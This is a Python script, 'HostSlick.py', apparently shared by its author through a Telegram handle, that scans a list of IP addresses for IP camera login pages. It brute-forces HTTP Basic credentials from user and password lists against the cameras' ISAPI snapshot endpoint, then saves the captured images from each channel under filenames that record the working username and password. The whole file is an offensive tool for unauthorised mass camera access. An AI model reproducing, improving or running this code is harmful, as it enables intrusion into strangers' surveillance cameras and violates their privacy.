"""
Nombre del archivo: HostSlick.py
Autor: SlickMercy
Fecha de creación: 1 de junio de 2023
Descripción: TG: SlickMercy.

Este código está sujeto a derechos de autor. Todos los derechos están reservados.
"""
import asyncio
import ipaddress
import os
import random
import sqlite3
from colorama import Fore, Style
import aiohttp
import base64
from art import *

async def check_camera(ip, usernames, passwords, port=80):
    try:
        async with aiohttp.ClientSession() as session:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
            }
            auth_headers = {}
            for username in usernames:
                for password in passwords:
                    auth_bytes = f"{username}:{password}".encode('utf-8')
                    auth_b64 = base64.b64encode(auth_bytes).decode('utf-8')
                    auth_headers[(username, password)] = {"Authorization": f"Basic {auth_b64}", "Accept": "application/octet-stream", "User-Agent": headers["User-Agent"]}
            url = f"http://{ip}:{port}/doc/page/login.asp?_"
            async with session.get(url, headers=headers, timeout=15) as response:
                if response.status == 200:
                    print(Fore.BLUE + f"[+] Login page found on {ip}" + Style.RESET_ALL)
                    with open("Online.txt", "a") as f:
                        f.write(ip + "\n")
                else:
                    print(Fore.YELLOW + f"[!] Login page not found on {ip}" + Style.RESET_ALL)

            camera_found = False
            for channel in range(1,32):
                images = []
                for username, password in auth_headers:
                    headers = auth_headers[(username, password)]
                    url = f"http://{ip}:{port}/ISAPI/Streaming/channels/{channel}01/picture"
                    await asyncio.sleep(random.uniform(0.1, 0.6))
                    async with session.get(url, headers=headers, timeout=15) as response:
                        if response.status == 200 and response.headers.get("Content-Type") == "image/jpeg":
                            image_data = await response.read()
                            images.append((username, password, image_data))
                if images:
                    camera_found = True
                    print(Fore.GREEN + f"[+] Connected to {ip}" + Style.RESET_ALL)
                    for i, (username, password, image_data) in enumerate(images):
                        filename = f"pics/{ip}_{username}_{password}_{port}_{channel}.jpg"
                        with open(filename, "wb") as f:
                            f.write(image_data)
                        print(Fore.BLUE + f"[+] Saved image from camera {ip} channel {channel}" + Style.RESET_ALL)
            if camera_found:
                return True
    except asyncio.exceptions.TimeoutError:
        print(Fore.RED + f"[-] Connection to {ip} timed out" + Style.RESET_ALL)
    except aiohttp.ClientError as e:
        print(Fore.RED + f"[-] An error occurred while connecting to {ip}: {e}" + Style.RESET_ALL)
    return False              
    
async def scan_hosts(port=80, concurrency=10):
    hosts_file_path = "host.txt"
    credentials_file_path = "pass.txt"
    users_file_path = "user.txt"  
    try:
        with open(hosts_file_path) as f:
            hosts = [line.strip() for line in f.readlines()]
        with open(credentials_file_path) as f:
            passwords = [line.strip() for line in f.readlines()]
        with open(users_file_path) as f: 
            users = [line.strip() for line in f.readlines()]  
    except FileNotFoundError as e:
        print(Fore.RED + f"[-] {e.filename} not found" + Style.RESET_ALL)
        return
    if not os.path.exists("pics"):
        os.makedirs("pics")
    total_hosts = len(hosts)
    current_host_count = 0
    tasks = []
    async with aiohttp.ClientSession() as session:
        sem = asyncio.Semaphore(concurrency)
        for host in hosts:
            current_host_count += 1
            print(f"Scanning {host}... ({current_host_count}/{total_hosts})")
            try:
                ip = ipaddress.ip_address(host)
                async with sem:
                    task = asyncio.create_task(check_camera(str(ip), users, passwords, port))  
                    tasks.append(task)
            except ValueError:
                print(Fore.RED + f"[-] {host} is not a valid IP address" + Style.RESET_ALL)
                continue
        results = await asyncio.gather(*tasks)
        num_connected = sum(results)
        print(Fore.GREEN + f"[+] Connected to {num_connected} cameras" + Style.RESET_ALL)

# Define el logotipo personalizado
logo = """
             _    __..-:┑
    TG: @SlickMercy
"""

# Imprime el logotipo personalizado
print(Fore.YELLOW + logo + Style.RESET_ALL)

# Solicita el puerto y nivel de concurrencia al usuario
port = input("Enter the port number (default is 80): ")
concurrency = input("Enter the concurrency level (default is 10): ")
port = int(port) if port else 80
concurrency = int(concurrency) if concurrency else 10

# Ejecuta la función scan_hosts con los valores proporcionados
asyncio.run(scan_hosts(port, concurrency))
